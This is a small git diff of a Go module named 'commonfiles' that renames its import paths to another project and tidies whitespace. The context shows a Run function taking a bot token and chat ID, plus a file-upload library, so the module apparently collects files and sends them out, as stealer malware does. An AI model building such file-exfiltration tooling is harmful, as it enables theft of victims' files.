@@ -1,14 +1,15 @@
 package commonfiles
 
 import (
-	"github.com/unf6/vryxen/pkg/utils/common"
-	"github.com/unf6/vryxen/pkg/utils/requests"
-	"github.com/unf6/vryxen/pkg/utils/fileutil"
 	"fmt"
 	"log"
 	"os"
 	"path/filepath"
 	"strings"
+
+	"github.com/lukyydnv/hakaist/pkg/utils/common"
+	"github.com/lukyydnv/hakaist/pkg/utils/fileutil"
+	"github.com/lukyydnv/hakaist/pkg/utils/requests"
 
 	"github.com/KasimKaizer/gofileioupload"
 )
@@ -97,7 +98,7 @@ func Run(botToken string, chatID string) {
 				if err != nil {
 					return nil
 				}
-				
+
 				if info.IsDir() {
 					return nil
 				}
